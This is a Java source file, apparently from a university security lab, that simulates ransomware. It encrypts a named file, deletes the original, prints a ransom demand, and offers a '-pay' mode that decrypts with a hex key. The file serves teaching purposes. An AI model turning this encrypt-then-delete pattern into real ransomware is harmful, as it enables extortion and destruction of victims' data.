package ch.zhaw.its.lab.secretkey;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.File;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class Ransom {
    private enum Mode {
        HOLD_RANSOM, PAY_RANSOM,
    }

    private static void usage() {
        System.err.println("usage: RansomRansom [-ransom|-pay] infile outfile [key]");
    }

    public static void main(String[] args) throws NoSuchPaddingException, InvalidAlgorithmParameterException,
            NoSuchAlgorithmException, IOException, BadPaddingException, IllegalBlockSizeException,
            InvalidKeyException {
        if (args.length != 3 && args.length != 4) {
            usage();
            System.exit(1);
        }

        String inFile = args[1];
        String outFile = args[2];

        Mode mode = args[0].equals("-pay") ? Mode.PAY_RANSOM : Mode.HOLD_RANSOM;

        if (mode == Mode.PAY_RANSOM && args.length != 4) {
            usage();
            System.err.println("key missing");
            System.exit(1);
        }

        FileEncrypter e = new FileEncrypter(inFile, outFile);

        if (mode == Mode.HOLD_RANSOM) {
            e.encrypt();
            deleteFile(inFile);
        } else {
            assert mode == Mode.PAY_RANSOM;
            byte[] rawKey = decodeKey(args[3]);
            System.out.println("Trying with key " + DatatypeConverter.printHexBinary(rawKey));
            e.decrypt(rawKey);
        }
    }

    private static byte[] decodeKey(String rawKey) throws IOException {
        return DatatypeConverter.parseHexBinary(rawKey);
    }

    private static void deleteFile(String name) {
        File input = new File(name);
        if (input.delete()) {
            System.out.println("MUAHAHAHAHAHAHA! The original file \"" + name + "\" is gone, ");
            System.out.println("the key is also gone. The encryption algorithm is AES.");
            System.out.println("Now you must pay $$$ to get the files back! Resistance is futile!");
        } else {
            System.err.println("Deletion failed");
        }

    }
}
